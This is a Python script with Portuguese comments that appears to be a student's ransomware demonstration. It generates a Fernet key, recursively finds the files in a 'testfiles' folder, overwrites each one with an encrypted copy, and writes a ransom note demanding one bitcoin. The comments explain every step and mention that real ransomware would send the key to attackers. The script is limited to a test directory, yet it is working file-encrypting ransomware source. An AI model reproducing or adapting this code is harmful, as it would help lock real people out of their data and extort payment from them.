from cryptography.fernet import Fernet
import os 


## gerar chave de criptografia, encontrar arquivos em um diretório específico, criptografar os arquivos e criar uma mensagem de resgate.
def gerar_chave(): 
    chave = Fernet.generate_key() 
    ## gera uma chave de 32 bytes(base64 URL safe), sendo unica e usada para criptografar e descriptografar os arquivos.

    with open("chave.key", "wb") as chave_file: 
        ## abre ou cria um arquivo chamado "chave.key" no modo binario (wb)
        ## with garante que o arquivo seja fechado depois, que nem o close() em java

        chave_file.write(chave)   
        ## escreve a chave gerada no chave.key para ser usada depois (descriptografar os arquivos)
    ## essa funçao inteira gera uma nova chave toda vez, sobrescrevendo a antiga
    ## em um ransomware real a chave é enviada para atacantes
def carregar_chave(): 
    return open("chave.key", "rb").read()
    ## abre o chave key em modo binario e le o conteudo, retornando os bytes

def criptografar_arquivo(arquivo, chave): 
    ## arquivo é o caminho dele, nao ele em si
    f = Fernet(chave)
    ## instancia de fernet com a chave fornecida
    with open(arquivo, "rb") as file: 
        dados = file.read()
        ## novamente abre o arquivo em binario e o armazena em dados fazendo a leitura
    dados_encriptados = f.encrypt(dados)
    ## criptografa os dados usando a chave fornecida e depois os retorna
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
        ## abre o arquivo em modo de escrita binaria e o substituti pelos dados criptografados


def encontrar_arquivos(diretorio):
    ## funcao pra encontrar todos os arquivos em subd/diretorios, excluindo o main e chaves
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        ## percorre recursivamente o diretorio (os.walk) e retorna uma tupla para o diretorio atual (raiz) 
        ## ignora os subdiretorios (_) e retorna os arquivos encontrados (nomes arquivos diretorio atual)
        for nome in arquivos:
            ## itera sobre cada nome de arquivo encontrado na lista arquivos definida no loop anterior
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
            ## os.path.join junta o caminho do diretorio com o nome do arquivo para formar o caminho completo
            ## verifica se n é o main ou se n acba com .key para n criptografar eles dois
    return lista

def criar_mensagem():
    with open("LEIA ISSO.txt", "w") as f:
        ## abre ou cria um leia isso.txt em modo de escrita e o with fecha automaticamente
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!")
        ## aqui é pra exigir resgate da vitima 
def main():
    gerar_chave()
    chave = carregar_chave() ##carrega a chave receem gerada do arquivo 
    arquivos = encontrar_arquivos("testfiles") ## encontra arquivos no diretorio
    for arquivo in arquivos: 
        criptografar_arquivo(arquivo, chave) ## os criptografa
    criar_mensagem() ##cria mensagem
    print("Ransoware executado! Arquivos criptografos ")

if __name__ == "__main__":
    main() ## o name == main aqui é para garantir que o script ta rodando diretamente e n ta sendo importado
    ## o name é main em python, quando o arquivo for o ponto de entrada
    ##usando para garntir que o codigo so execute quando o arquivo é executado